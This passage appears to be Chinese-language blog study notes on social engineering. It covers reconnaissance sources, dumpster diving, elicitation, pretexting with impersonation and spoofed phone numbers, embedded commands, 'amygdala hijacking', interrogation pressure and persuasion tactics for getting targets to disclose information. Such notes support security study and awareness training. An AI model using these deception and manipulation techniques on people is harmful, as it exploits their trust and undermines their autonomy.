的网站中搜索</td></tr><tr><td>related:</td><td>和关键词相关的网页</td></tr></tbody></table><h2 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h2><p>利用 <a href="https://www.shodan.com/">Shodan</a> 检索服务器信息以及开放的端口</p><h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2><p>利用 <a href="https://www.whois.net/">Whois</a> 可以查询域名以及域名所有人的信息</p><h2 id="WayBack-Machine"><a href="#WayBack-Machine" class="headerlink" title="WayBack Machine"></a>WayBack Machine</h2><p>利用 <a href="https://archive.org/web/">WayBack Machine</a> 可以查询网站的历史归档，比 GoogleCache 更加久远</p><h2 id="公共服务器"><a href="# 公共服务器" class="headerlink" title="公共服务器"></a>公共服务器</h2><p>IP/ 域名 / 端口扫描</p><h2 id="个人网站 - 博客"><a href="# 个人网站 - 博客" class="headerlink" title="个人网站 / 博客"></a>个人网站 / 博客 </h2><p> 很多人都喜欢建立自己的个人网站或博客，将自己的信息展示给所有可以访问的人</p><h2 id="公开报告"><a href="# 公开报告" class="headerlink" title="公开报告"></a>公开报告 </h2><p> 结合 GoogleHacking 搜索目标企业或机构的公开报告</p><h2 id="社交平台"><a href="# 社交平台" class="headerlink" title="社交平台"></a>社交平台</h2><ul><li><a href="https://twitter.com/">Twitter</a>/<a href="https://facebook.com/">FaceBook</a>/<a href="https://blippi.com/">Blippy</a>/<a href="https://www.linkedin.com/">LinkedIn</a>/<a href="https://myspace.com/">MySpace</a>/<a href="http://pleaserobme.com/">PleaseRobMe</a>/<a href="http://icanstalku.com/">ICanStalkU</a>/<a href="https://www.youtube.com/">YouTuBe</a>/<a href="https://www.wikipedia.org/">WikiPedia</a>…</li><li>QQ/ 微信 / 新浪微博 / 百度贴吧 /QQ 空间…</li></ul><h2 id="观察"><a href="# 观察" class="headerlink" title="观察"></a>观察 </h2><p> 使用望远镜 / 监控 / 窃听等辅助设备远程观察</p><h2 id="垃圾收集"><a href="# 垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集 </h2><p> 很多垃圾桶里也藏着宝贝，不要放过任何一张写着字纸与存储设备！在一些大公司的垃圾桶里经常有没有完全被碎纸机销毁的重要档案，以及员工丢弃的 U 盘 / 移动硬盘等存储设备，经过数据恢复后可以获取重要信息。</p><h2 id="交流"><a href="# 交流" class="headerlink" title="交流"></a>交流 </h2><p> 所有人的身体和精神都存在着一个私密空间，通常这个私密空间里藏着很多重要的信息，交流就是试图闯入这个私密空间获取信息的过程。</p><h3 id="基本规则"><a href="# 基本规则" class="headerlink" title="基本规则"></a>基本规则</h3><ol><li>不要理所当然的认为目标与你的情况完全一样</li><li>不要理所当然的认为目标会按照你的方式接受与解释信息</li><li>交流不是一个绝对的，一成不变的过程</li><li>如果有多人参与交流，应始终假设每个参与者的情况各不相同</li></ol><h3 id="香农 - 韦佛交流模型 - 鼻祖模型"><a href="# 香农 - 韦佛交流模型 - 鼻祖模型" class="headerlink" title="香农 - 韦佛交流模型 (鼻祖模型)"></a> 香农 - 韦佛交流模型(鼻祖模型)</h3><p><img src="/2019/08/10/Social-Engineering-NoteBook/0e02817f703d1e72ee30f68ecd10ab95.png"></p><ul><li>信息源: 创造信息</li><li>发送方: 将信息编码为信号</li><li>信道: 传输信号</li><li>接收方: 从信号中解码信息</li><li>目的地: 信息的重点</li></ul><p>问题：</p><ol><li>技术问题: 信息发送的准确性</li><li>语义问题: 信息表达的准确性</li><li>效率问题: 接收到的信息对行为影响的有效性</li></ol><h3 id="贝罗模型 -SMCR 发送者 - 信息 - 信道 - 接收者通信模型"><a href="# 贝罗模型 -SMCR 发送者 - 信息 - 信道 - 接收者通信模型" class="headerlink" title="贝罗模型 (SMCR 发送者 - 信息 - 信道 - 接收者通信模型)"></a> 贝罗模型(SMCR 发送者 - 信息 - 信道 - 接收者通信模型)</h3><ul><li>S- 信息源: 常规技巧 / 态度 / 知识 / 社交系统 / 文化</li><li>M- 信息: 内容 / 元素 / 处理 / 结构 / 编码</li><li>C- 信道: 看 / 听 / 触 / 闻 / 尝</li><li>R- 接收方: 常规技巧 / 态度 / 知识 / 社交系统 / 文化</li></ul><p>符号和标识的形式属性 <br> 符号 / 表情及其使用者之间的关系 <br> 符号和标识之间的联系及其含义</p><h3 id="通信的事物模型"><a href="# 通信的事物模型" class="headerlink" title="通信的事物模型"></a>通信的事物模型</h3><p><img src="/2019/08/10/Social-Engineering-NoteBook/c049d4f97b7f00533569d804b393b65a.png"></p><p>制定交流模型：</p><ul><li>信息源: 社会工程师</li><li>信道: 传达方式(语言 / 非语言)</li><li>信息: 向接收者传达的内容(命令)</li><li>接收者: 目标</li><li>反馈: 当有效地将信息传达出去后，希望目标给予的回应(预期结果)</li></ul><h1 id="诱导"><a href="# 诱导" class="headerlink" title="诱导"></a>诱导 </h1><p> 诱导是一种引发或诱发某种特定行为的刺激</p><h2 id="原因"><a href="# 原因" class="headerlink" title="原因"></a>原因</h2><ol><li>大部分人希望看上去比较有礼貌，尤其是对陌生人</li><li>专业人士希望自己看起来见多识广</li><li>如果得到赞赏，大部分人通常会更加乐意分享信息(多巴胺)</li><li>大部分人不会为了撒谎而撒谎</li><li>大部分人对貌似关心自己的人会比较友善</li></ol><h2 id="前提"><a href="# 前提" class="headerlink" title="前提"></a>前提</h2><ol><li>表现得自然，不要紧张</li><li>拥有足够的知识背景(不能伪装成自己不可能成为的人)</li><li>切忌 <strong> 贪婪</strong></li></ol><h2 id="铺垫"><a href="# 铺垫" class="headerlink" title="铺垫"></a>铺垫 </h2><p> 以一种 <strong> 隐晦或婉转 </strong> 的方式植入想法或思路</p><h2 id="要点"><a href="# 要点" class="headerlink" title="要点"></a>要点</h2><ol><li>不惧与他人交谈，并处于非常规的场景中</li><li>真正关心他人，即使是陌生人，乐于分享和倾听</li><li>只在有了真正的解决方案时才提供建议或帮助</li><li>在他人说出自己的问题时，不做主观判断</li></ol><h2 id="方法"><a href="# 方法" class="headerlink" title="方法"></a>方法</h2><ol><li>唤醒他人的自我。精心地吹捧会促使目标说出一些重要的信息</li><li>表达共同的主题。一种迅速拓展关系的手段，会使目标同意进一步地接触，构建信任与和谐的关系</li><li>故意说错。大部分人在听到错误的表达后会有矫正的欲望，似乎他们的正确性受到了挑战，以告诉他人显示自己的学识渊博，不能容忍错误表达</li><li>主动提供信息。利用“责任感”，在交流中主动提供信息会促使目标提供同样价值的信息，人们喜欢分享类似的信息</li><li>假装高深。展示一些信息，假装知道一些内情，使用诱导继续展开话题</li><li>利用酒精地影响(第三方手段)。酒后吐真言</li></ol><h2 id="提问的技术"><a href="# 提问的技术" class="headerlink" title="提问的技术"></a>提问的技术</h2><ol><li><p>开放式问题。目标的不仅仅用”是”或”不是”可以回答的问题，例如”为什么”/“怎样”。若目标很抵触开放式问题，可以使用 <strong> 金字塔方法</strong>，从范围窄的问题开始询问，一步一步拓宽问题</p></li><li><p>封闭式问题。限制目标回答的范围(有穷)，通常不是为了得到详细的信息，而是对话题进行引导</p></li><li><p>引导式问题。具有答案暗示的开放性问题，引导目标，为其提供表达自己观点的机会，但是限制其发挥范围，暗示目标你对问题的答案已经有所了解</p></li></ol><blockquote><p>人们通常会构造自己的记忆来契合自己对世界的认知，因此在进行诱导时可以利用这一手段来构造或扰乱目标的记忆</p></blockquote><h3 id="假设性问题"><a href="# 假设性问题" class="headerlink" title="假设性问题"></a>假设性问题</h3><ol><li>假设目标对问题已经拥有特定的知识</li><li>通常此类问题是确定目标是否拥有特定的信息</li><li>不要让目标了解事情的全貌，否则会丧失话题控制权</li><li>不能通过假设性问题来指责目标的错误</li><li>将事实贯穿在问题中，尽量不要携带虚假信息</li></ol><h3 id="提问的原则"><a href="# 提问的原则" class="headerlink" title="提问的原则"></a>提问的原则</h3><ol><li>问题太多会吓跑目标</li><li>问题太少会让目标觉得不自在</li><li>一次只问一个问题，同时提出的问题太多会使目标出现认知负荷，从而使目标有可能下意识选择性的不回答一些问题</li><li>不能显得太急切或太无趣</li></ol><h2 id="建立密切关系"><a href="# 建立密切关系" class="headerlink" title="建立密切关系"></a>建立密切关系</h2><ol><li>人为时间限制。人们在遇到一个试图接近自己的陌生人时通常首先会下意识思考”这个人在我的生活中会停留多久”，当人们意识到这个陌生人会在自己的生活中停留很长时间的话会产生戒备心理，因此在接近目标时首先要让目标感觉自己不会打扰目标太久，不要让目标觉得自己的兴趣点在对方身上，使目标安心。例如”可以打扰你一会吗”/“可以问你一个小问题吗”</li><li>匹配的非语言行为。控制环境 / 微表情 / 肢体语言</li><li>放慢语速。说话越快越容易出错，也会显得不自信</li><li>同情。同情 / 悲伤是最快与目标建立关系的方式</li><li>自我抑制。延迟自我意识，使目标的观点 / 想法 / 需求优先。同时可以：表现得谦逊、压低声音、轻柔的 / 无性别区分地碰触<br> 温和的目光、较低的身体姿势等等。</li><li>包容。适当地包容目标，对目标进行恭维会使目标大脑释放多巴胺</li><li>询问开放式问题。尽量多用开放式问题来拓展话题</li><li>让步。适当与目标分享一些有价值的信息</li><li>互利。给予通常会使目标有回报的需求</li><li>调整预期。不要贪婪，见好就收，需要对诱导结果有一个预期目标</li></ol><h1 id="伪装"><a href="# 伪装" class="headerlink" title="伪装"></a>伪装</h1><blockquote><p>创造虚构的环境以去哪说目标泄露信息或者做出某种行为</p></blockquote><ol><li>前期调查越充分，成功的几率越大(信息收集)，可以利用目标的个人性格或情感依托进行伪装</li><li>植入个人爱好。在伪装中加入自己感兴趣的话题和活动可以使自己对伪装更加 <strong> 自信 </strong>，<strong> 自信 </strong> 有助于说服目标相信你，自信心始终与没目标和任务环境有关</li><li>认知失调理论。人们倾向于协调自己的信仰 / 观点乃至几乎所有的认知，如果态度和行为之间存在不协调，就必须修正这种不协调。<ul><li>影响因素：<ol><li>不协调的信念的数量</li><li>每个信念的重要性</li></ol></li><li>消除方式(按照推荐的优先级排序)：<ol><li>增加更多协调的信念以超过不协调的信念</li><li>降低不协调信念的重要性</li><li>改变不协调的信你以使它们协调(通过观点 / 行动 / 知识使伪装与目标的认知一致或协调)</li><li>建立信念系统</li></ol></li></ul></li><li>练习方言或表达方式。用不同方言与人们共同会留下深刻的印象</li><li>使用电话。不需要与目标面对面，降低伪装的成本<ul><li>使用”剧本大纲(Script)”</li><li>用适当的方法 / 语速 / 语调 / 音调与措辞表达情感</li><li>伪造电话号码</li></ul></li><li>伪装越简单越好。保持故事情节 / 事实和细节的简单性会增强其可信性，过于复杂会使目标甚至自己出现认知负荷。不过分追求细枝末节，允许故事发展，使目标用想象力填补故事空隙，同时一些错误会使故事更加真实</li><li>伪装必须显得自然<ul><li>不要考虑自己的感受</li><li>不要把事情太当真</li><li>学会寻找相关信息</li><li>积累更多经验</li></ul></li><li>为目标提供逻辑结论或下一步安排，人们都希望被告知下一步应该做什么，注意提出的要求应该和自己伪装的身份相一致</li><li>适当的使用工具，例如标志 / 工具设备 / 配套服装 / 名片等</li></ol><h1 id="社会工程心理学"><a href="# 社会工程心理学" class="headerlink" title="社会工程心理学"></a>社会工程心理学 </h1><h2 id="思维模式"><a href="# 思维模式" class="headerlink" title="思维模式"></a> 思维模式</h2><blockquote><p>使目标认可你的非语言行为，用目标认可的表达方式，并且在音量 / 语调和方言上相匹配</p></blockquote><p>感官：视觉 / 听觉 / 触觉 / 味觉 / 嗅觉。通常在这五种感官中某一种会占主导地位，其中前三种为主要的感官思维模式</p><h3 id="视觉思维者 - 大部分人"><a href="# 视觉思维者 - 大部分人" class="headerlink" title="视觉思维者 (大部分人)"></a> 视觉思维者 (大部分人)</h3><p> 通常记得事物的样貌，能够清晰地记住场景，可以清楚的描述过去的时间，甚至可以构建未来事件的图像。视觉输入与他们的决策相关，会依据在视觉上吸引他们的东西来做决策</p><ul><li>特征点：我 <strong> 明白 </strong> 你的意思 / 我 <strong> 看</strong>那样挺好的 / 我大概有点 <strong> 印象 </strong> 了</li><li>次感元：光线(亮 / 暗)、尺寸(大 / 小)、颜色(黑白 / 彩色)、运动(快 / 慢)、焦点(清晰 / 模糊)</li></ul><h3 id="听觉思维者"><a href="# 听觉思维者" class="headerlink" title="听觉思维者"></a>听觉思维者 </h3><p> 会记住事件的声音，相比于视觉思维者，通过倾听而可以获取更多信息。总能记住事情发生的方式，可以用声音唤起记忆。和听觉思维者说话时需要注意措辞，听觉思维者根据听到的词语表达来进行决策</p><ul><li>特征点：<strong>洪亮 </strong> 并且 <strong> 清楚 </strong>…/ 这件事<strong> 告诉 </strong> 我…/<strong>听起来 </strong> 不错</li><li>次感元：音量(大 / 小)、音调(高 / 低)、音准(高 / 低)、节拍(快 / 慢)、距离(远 / 近)</li></ul><h3 id="动觉思维者"><a href="# 动觉思维者" class="headerlink" title="动觉思维者"></a>动觉思维者 </h3><p> 特别在意感受，能够记住事物对自己带来的感受，通常喜欢用自己的双手感知物体。使动觉思维者会想起与某一件事相关联的感觉 / 情感，进行感觉上的练习</p><ul><li>特征点：我能 <strong> 抓住 </strong> 那个想法的要点 / 那个是怎么 <strong> 抓住 </strong> 你的 / 我会 <strong> 联系 </strong> 你的</li><li>次感元：强度(强 / 弱)、面积(大 / 小)、质地(粗糙 / 光滑)、温度(冷 / 热)、重量(重 / 轻)</li></ul><h3 id="辨别主导感官"><a href="# 辨别主导感官" class="headerlink" title="辨别主导感官"></a>辨别主导感官 </h3><p> 自我介绍 -&gt; 开始简短交流 -&gt; 观察 -&gt; 提问，识别并利用他人的主导感官，使其处于非常舒适的氛围中</p><h2 id="神经语言程序学 -NLP"><a href="# 神经语言程序学 -NLP" class="headerlink" title="神经语言程序学 (NLP)"></a> 神经语言程序学(NLP)</h2><blockquote><p>一种人际沟通模型，主要关注成功的行为模式和内在的主观经验之间的关系，一种非传统的治疗系统，旨在教育人们要有自我意识和有效沟通，并改变他们的心里和情绪行为的模式</p></blockquote><h3 id="准则"><a href="# 准则" class="headerlink" title="准则"></a>准则 </h3><p> 人们必须通过潜意识思维做出改变，新的行为必须符合其原始的积极意向，而且改变必须发生于思维状态内部，而不仅仅是行为层面</p><h3 id="语音语调"><a href="# 语音语调" class="headerlink" title="语音语调"></a>语音语调 </h3><p> 使用嵌入式指令影响目标以某种方式进行思考或采取某种行动，通过变换语调强调句子中的某些词语，是人们的潜意识将重点放在那些词语上</p><h2 id="句型结构"><a href="# 句型结构" class="headerlink" title="句型结构"></a>句型结构 </h2><p> 改变句子中的语音下降点嵌入命令，例如改变句尾音调：</p><ol><li>上扬 - 疑问</li><li>平滑 - 陈述</li><li>下降 - 命令</li></ol><h3 id="终极声音"><a href="# 终极声音" class="headerlink" title="终极声音"></a>终极声音 </h3><p> 降低命令的语调，让声音具有动感，发挥气息的极限，使胸腔产生共鸣</p><h3 id="要点 -1"><a href="# 要点 -1" class="headerlink" title="要点"></a>要点</h3><ol><li>通过使用音调和重音在目标潜意识中嵌入命令</li><li>谨慎的选择用词。积极的词语使目标积极思考，消极的词语是目标不会思考太多</li><li>创建一个可用于当面或电话社会工程学命令语句列表</li></ol><h2 id="思维缓冲溢出"><a href="# 思维缓冲溢出" class="headerlink" title="思维缓冲溢出"></a>思维缓冲溢出 </h2><h3 id="基本原则"><a href="# 基本原则" class="headerlink" title="基本原则"></a> 基本原则 </h3><p> 人们最终在有意识地做出决定时，他们的决定不仅仅依据听到的内容，还有涉及视觉 / 感觉和情感</p><h3 id="预期定律"><a href="# 预期定律" class="headerlink" title="预期定律"></a>预期定律 </h3><p> 人们通常会遵循他们感受到的别人的期望或要求来做决定，例如：</p><p>“你认识我的那个邻居拉尔夫吗，他总是开着那辆绿色的车”</p><p>则在目标中植入的信息如下：</p><ol><li>我认识我的邻居</li><li>他叫拉尔夫</li><li>他有驾照</li><li>他开着一辆绿色的车</li></ol><h3 id="嵌入式指令"><a href="# 嵌入式指令" class="headerlink" title="嵌入式指令"></a>嵌入式指令 </h3><p> 基本原则：</p><ol><li>指令简短 (3-4 个字符) 以避免认知负荷</li><li>在普通的语句中加入强调(语气要正常)</li><li>搭配适当的面部表情和肢体语言</li></ol><p>方法：</p><ul><li>创建一种情绪或思维模式。当你…/ 当你…时感觉是怎样的 / 有个人能够…/ 既然你…</li><li>巧用引用或故事。将指令嵌入故事中</li><li>善用否定。利用人们的逆反心理</li><li>使目标想象。使目标需要适当的联想才能回答</li><li>思维缓冲区溢出 = 预期定律 + 思维铺垫 + 嵌入式指令</li></ul><p>首先在与目标开始交谈时结合使用短语 / 肢体语言和假定性言辞，假设所要求的事情已经实现，之后通过一些语句在目标思维中做铺垫，方便后续指令植入。</p><h2 id="手势"><a href="# 手势" class="headerlink" title="手势"></a>手势 </h2><h3 id="锚定"><a href="# 锚定" class="headerlink" title="锚定"></a> 锚定 </h3><p> 用特定的手势与一种类似表达形式相关联，例如:</p><ul><li>当谈论到积极的想法时使用右手手势</li><li>当谈论到消极的想法时使用左手手势</li></ul><p>即可锚定左手代表消极，右手代表积极</p><h3 id="镜像"><a href="# 镜像" class="headerlink" title="镜像"></a>镜像 </h3><p> 尝试匹配目标的个性化手势，目标在看到熟悉的手势时会有自在的感觉，但是不要完全相同，否则会起到反作用</p><h3 id="手势摆放"><a href="# 手势摆放" class="headerlink" title="手势摆放"></a>手势摆放 </h3><p> 观察目标手臂及手的摆放和位置：</p><ul><li>感到放松时肘部会没有拘束的放在身体两侧</li><li>感到威胁 / 害怕时肘部向胸腔收近(保护重要器官)</li><li>目标可能会用手势描述出不会说出的信息</li><li>手掌张开表示诚意</li><li>将指尖搭在一起代表自信，认为自己很有权威</li><li>敲击 / 打击手指代表焦虑</li><li>摸脸 / 下巴代表思考</li><li>触摸头发代表不安</li><li>触摸耳朵代表犹豫不决</li></ul><p>适当利用手势有助于伪装</p><ul><li>不要刻意记手势，而是要记住手势的附加信息</li><li>避免单调 / 重复的手势</li><li>避免表示焦虑或者动作过大的手势</li><li>手势不要过多</li></ul><h2 id="聆听"><a href="# 聆听" class="headerlink" title="聆听"></a>聆听</h2><blockquote><p>一个人讲话的方式可以透露出很多信息(情绪 / 语速 / 状态)</p></blockquote><ol><li>集中注意力，高度关注目标，密切专注目标的肢体语言 / 面部表情</li><li>提供聆听的证据。表现出真诚与微笑，不时地点头，证明正在积极地聆听目标</li><li>提供有价值的反馈。时不时地重述或概括聆听到的内容或者提问相关问题代表有很强的欲望去深入理解</li><li>不要打断目标。尽量不要打断，但是情况适当的打断也是一种手段</li><li>适当的反应。保持尊重，注意自己的情绪，尽量抑制自己的成见。<br>反射性响应：<ul><li>积极聆听</li><li>当需要做出回应时注意自己的情绪</li><li>重复 / 概括听到的内容</li><li>可以用一些含糊的词语做出反应</li></ul></li></ol><h2 id="共识"><a href="# 共识" class="headerlink" title="共识"></a>共识</h2><blockquote><p>无意识的人类互动最重要的特性或特征之一，是看法上的共性，与交谈的另一方达成同步，或处于相同的波段</p></blockquote><ol><li>真正的想要了解他人</li><li>注意自身形象(着装 / 外表 / 个人卫生)</li><li>善于聆听</li><li>留心对他人的影响，注意自己的第一印象</li><li>尽量少谈论自己，让目标谈论他们自己</li><li>同情心。感同身受，认真倾听，并确定潜在的情感，站在对方的角度思考，但是不要显得盛气凌人</li><li>扩大自己的知识领域</li><li>表达好奇心。保持心胸开阔，探究并且接受别人在某一话题上的想法</li><li>满足他人的需求。创造一个环境满足对方的需求。四类基本心里需求：<ol><li> 归属 / 联系 / 爱</li><li> 权力 / 地位 / 能力</li><li> 自由 / 责任</li><li> 娱乐 / 学习</li></ol></li><li>使用 NLP<ul><li>呼吸频率保持一致</li><li>语音 / 语调保持一致，留心关键短语</li><li>肢体语言保持一致，表现出类似肢体语言</li></ul></li><li>测试共识的方法：做一些下意识的动作，观察目标是否出现类似动作</li></ol><h2 id="杏仁核劫持"><a href="# 杏仁核劫持" class="headerlink" title="杏仁核劫持"></a>杏仁核劫持</h2><blockquote><p>情绪处理的过程是无意识的，自动的，并且受到输入感官的影响</p></blockquote><h3 id="杏仁核"><a href="# 杏仁核" class="headerlink" title="杏仁核"></a>杏仁核 </h3><p> 杏仁核状大规模灰质，存在于大脑前内侧中间，是颞叶皮层的一部分。是人类的情感处理器，处理所有形态的输入（感觉），并且投射到大脑的不同区域（脑干、下丘脑、海马体、基底神经节、大脑皮层）</p><h3 id="自动驾驶"><a href="# 自动驾驶" class="headerlink" title="自动驾驶"></a>自动驾驶 </h3><p> 原理：</p><ol><li>杏仁核处理情感的速度比大脑快</li><li>杏仁核激活，新皮质近乎关闭，肾上腺素、荷尔蒙水平及血压升高，记忆开始变得低效，失去高效交流的能力</li><li>触发式强制控制负责情绪、同情或社交的脑区可以使人丧失逻辑能力</li><li>杏仁核会不断审视环境刺激，寻找触发人们理解周围世界的非语言反馈</li><li>感受周围的环境，观察他人从非语言形式表现出的消极情绪，例如有时莫名的不安，紧张，恐惧等，有助于人们保持警惕</li><li>情绪可以传染（环境、氛围）</li></ol><p>如果杏仁核处理一些强烈的感觉和情绪，杏仁核会关闭大脑的逻辑思维中心，只依靠感性处理中心作决策（情绪化的决策）</p><p>利用方程：</p><ol><li>（感官输入 &gt; 共情）+ 逻辑中心关闭 = 杏仁核劫持 + 提出要求</li><li>杏仁核劫持 = 辅助非语言行为 + 情感共鸣内容 + 提出适当要求</li></ol><p>控制方法：杏仁核劫持是快速的，并且可被强烈的情绪延长，所以如果碰到杏仁核被劫持的情况，停下来暂时屏蔽强烈情感休息一会再做决定</p><h1 id="询问与审讯"><a href="# 询问与审讯" class="headerlink" title="询问与审讯"></a>询问与审讯 </h1><h2 id="区别"><a href="# 区别" class="headerlink" title="区别"></a> 区别 </h2><p> 询问: 目标在身体和心理上都处于舒适的状态 <br> 审讯: 通过审讯场所与问题向目标施压，使其感觉不适</p><h2 id="留意目标的变化"><a href="# 留意目标的变化" class="headerlink" title="留意目标的变化"></a>留意目标的变化</h2><table><thead><tr><th>特征</th><th>状态</th></tr></thead><tbody><tr><td>身体姿势</td><td>直立 / 瘫倒 / 倾斜</td></tr><tr><td>脸色</td><td>苍白 / 红 / 白 / 变化</td></tr><tr><td>头部</td><td>昂首 / 倾斜 / 前 / 后</td></tr><tr><td>眼睛</td><td>方向 / 睁开的状态</td></tr><tr><td>手 / 脚</td><td>动作 / 位置 / 颜色</td></tr><tr><td>口唇</td><td>位置 / 颜色 / 状态</td></tr><tr><td>主要感觉</td><td>视觉 / 听觉 / 活力 / 感觉</td></tr><tr><td>声音</td><td>音高 / 速率 / 变化</td></tr><tr><td>词语</td><td>长 / 短 / 音节的数量 / 功能障碍 / 停顿</td></tr></tbody></table><ul><li>注意目标的措辞（太短：预先演练过 / 太长：在准备撒谎）</li><li>注意时态 / 代词的变化</li><li>观察目标的一系列变化，确定目标的自然状态(基准)</li></ul><h2 id="审讯方法"><a href="# 审讯方法" class="headerlink" title="审讯方法"></a>审讯方法</h2><ol><li>正面交锋。已经确定目标要做的事，并且要求目标立刻去做(NLP/ 命令)</li><li>主题延伸。审讯者假定一个故事场景并多次传递给目标，观察目标的反应。展示辅助性的证据直接支持所描述的场景(伪装)</li><li>应付拒绝与反对。预先制定退出策略，仔细组织主题从而预先消除可能的反对</li><li>保持目标注意力集中。当目标开始考虑行为的不良后果时，克服内在的恐惧，镇定的按照预定目标驱动对方(驱动目标使其无法分神考虑后果)</li><li>展示其他途径(备用计划)</li><li>制定计划<ul><li>人物：目标的详细信息</li><li>事件：准备工作</li><li>时间：计划执行的时间段与原因（需要证据支持）</li><li>地点：计划的执行地点，确定最佳场所（环境因素）</li><li>原因：计划的目标（计划成功的标准）</li><li>方式：使用什么样的方式从目标获取信息（NLP/ 嵌入式指令 / 缓冲区溢出）</li></ul></li></ol><h2 id="其他审讯技巧"><a href="# 其他审讯技巧" class="headerlink" title="其他审讯技巧"></a>其他审讯技巧</h2><ol><li>直接。保持足够的信心，并且假设目标会进行反馈</li><li>间接。使目标成为谈话主角，通过诱导或精心设计的问题使目标泄漏信息</li><li>博取同情。在谈话中表达对目标的同情，留下善解他人的印象</li><li>激发情绪。利用前期已经收集的信息，激发并利用目标的情绪</li><li>合乎逻辑。充满信心，使自己的伪装合乎逻辑</li><li>咄咄逼人。提高音量，加快语速，使目标来不及思考合理性</li><li>组合。根据目标个性组合多种方法</li><li>保持冷静。被抓到的时候保持冷静 / 镇定，从而降低警觉</li><li>挽回面子。挽回目标的面子，给对方一个很好的借口</li><li>自尊心膨胀。令对方感到自豪，鼓吹目标的成就</li><li>夸张。夸大事件的严重性（在合理的范围内）</li><li>循序渐进。一步一步慢慢的突破</li></ol><h1 id="影响与操纵"><a href="# 影响与操纵" class="headerlink" title="影响与操纵"></a>影响与操纵</h1><blockquote><p>让他人想要以你所期许的方式去行动 / 反应 / 思考或建立信仰的过程</p></blockquote><h2 id="基本原则 -1"><a href="# 基本原则 -1" class="headerlink" title="基本原则"></a>基本原则</h2><ol><li>设定明确的目标<ul><li>想要什么？</li><li>如何确认目标已经完成？</li></ul></li><li>构建共识。了解目标精神状态，站在对方的立场上考虑，表达友善</li><li>洞察环境。对自身和周围环境保持警觉（观察 / 倾听）</li><li>灵活应变</li><li>内省。理解自己的情感</li></ol><h2 id="战术"><a href="# 战术" class="headerlink" title="战术"></a>战术 </h2><h3 id="回报 -——- 固有期望"><a href="# 回报 -——- 固有期望" class="headerlink" title="回报 —— 固有期望"></a> 回报 —— 固有期望</h3><ul><li>人们会帮助那些帮助过他们的人</li><li>人们不会伤害那些曾经帮助过他们的人<ul><li>送出某样有价值的东西</li><li>制造受惠的感觉，价值越高，受惠感越大</li><li>提出合理的请求</li></ul></li></ul><h3 id="义务"><a href="# 义务" class="headerlink" title="义务"></a>义务</h3><ul><li>基于社会 / 法律和道德要求，以及责任 / 合约或承诺人们认为必须要做的事</li><li>称赞 -&gt; 提出请求</li><li>黄金法则：己所不欲，勿施于人（对别人友好）</li></ul><h3 id="让步 -——- 对回报的利用（礼尚往来）"><a href="# 让步 -——- 对回报的利用（礼尚往来）" class="headerlink" title="让步 —— 对回报的利用（礼尚往来）"></a>让步 —— 对回报的利用（礼尚往来）</h3><p>必须对接受方有价值</p><p>原则：</p><ol><li>表示出让步。明确让对方知晓何时作出何种让步</li><li>要求和定义回报。植入回报的种子</li><li>视情况作出让步。作出没有风险的让步</li><li>分批作出让步。所有的让步不一定一次到位</li></ol><h3 id="稀缺 -——- 创造欲望"><a href="# 稀缺 -——- 创造欲望" class="headerlink" title="稀缺 —— 创造欲望"></a>稀缺 —— 创造欲望 </h3><p> 对可供选择的资源进行分配，由待分配物的稀缺性驱动，资源越稀少，物品的 <strong> 感知价值 </strong> 越高</p><ol><li>利用稀缺操纵人们的注意力（人们渴望得到难以企及的东西——成就感）</li><li>制造紧迫感</li><li>利用信息的稀缺性提升信息的价值</li></ol><h3 id="权威 -——- 不敢质疑"><a href="# 权威 -——- 不敢质疑" class="headerlink" title="权威 —— 不敢质疑"></a>权威 —— 不敢质疑 </h3><p> 人们更愿意听从他们眼中权威人士的指导和建议</p><p>类型：</p><ol><li>法律权威（保安 / 律师等）：伪装成大众敬畏或尊敬的角色</li><li>组织权威（老板 / 领导者 /CEO 等）：管理阶层</li><li>社会权威：社会团体中天生的领导者</li></ol><p>在适当情况下人们更可能对来自权威的主张作出快速反应，尽管这种所谓的权威甚至根本没有露面。此外在自动对权威作出反应时，人们往往是对权威的符号作出反应，而不是其本身（头衔 / 衣服 / 汽车 / 名片等符号）</p><h3 id="承诺和一致性"><a href="# 承诺和一致性" class="headerlink" title="承诺和一致性"></a>承诺和一致性 </h3><p> 通常人们会在言语、态度和行为上保持一致，根据以往的经验或期望所应有的预期。在作出承诺、明确立场后，人们会更加愿意同意那些和他们初始承诺一致的要求</p><p>获取信息承诺：</p><ol><li>询问那谢目标必须回答“是”的问题</li><li>希望“自己”能保持言行一致是很好的激励因素</li><li>人们渴望在他人看来自己始终言行一致</li><li>人们几乎不会违背自己口头、公开或自愿作出的承诺</li><li>通过扩大范围来增强其承诺的严肃性</li></ol><p>促使目标承诺采取一些小的行动或表示认同，利用这个承诺扩大范围，从而产生更好的效果</p><h3 id="喜欢"><a href="# 喜欢" class="headerlink" title="喜欢"></a>喜欢 </h3><p> 人们喜欢那些喜欢自己的人，人们会倾向于接受朋友给出的坏建议、而不是陌生人给出的好建议</p><p>原则：</p><ol><li>建立共识</li><li>自信积极的态度</li><li>与目标和环境保持一致</li><li>有效的进行沟通</li></ol><p>月晕效应：某人的一种特质会影响扩展到其他品质，倾向于关注他人的优点会影响一个人的决定。人们会倾向于将美丽和其他成功特性联系在一起</p><p>了解目标 -&gt; 伪装成目标期望的样子 -&gt; 构建信任关系</p><p>过度满足：过多的正面肯定可能会起到负面效应，需要通过问题或错误来给出肯定</p><h3 id="共识 - 社会认同"><a href="# 共识 - 社会认同" class="headerlink" title="共识 / 社会认同"></a>共识 / 社会认同 </h3><p> 社会影响会导致一个大的社会群体对正确或错误的判断达成一致</p><ol><li>社会认同。人们会做他人正在做的事情，尽管可能不知道那件事情是否是符合自己价值的，如果和周围人群高行为一致，就不会显得失礼</li><li>不确定。人们在确定并且形式不明的情况下，更可能观察他人的行为，并认为这种行为是正确的</li><li>相似性。人们更倾向于跟随与自己类似的人都引导</li></ol><h2 id="框架"><a href="# 框架" class="headerlink" title="框架"></a>框架 </h2><pre><code> 人活中的信息和经历，能够在人们必须作出决定的时候改变其反应方式任何可以用来改变人们的认知或者人们做决定的方式的东西* 参考框架    一组看法、条件或假设，决定了人们如何接近、认知或理解某一事物* 目标感知和价值    目标对一件事物的认知会提高或降低它的价值    例如 80% 的瘦肉和 20% 的肥肉* 框架联盟    * 框架共振        个人框架由于一致或互补而形成关联    * 条件        * 框架努力成果的鲁棒性、完备性和彻底性            诊断框架的问题            分析并找出解决方案            如果成功了，号召行动        * 提议的框架和大众信仰系统之间的关系            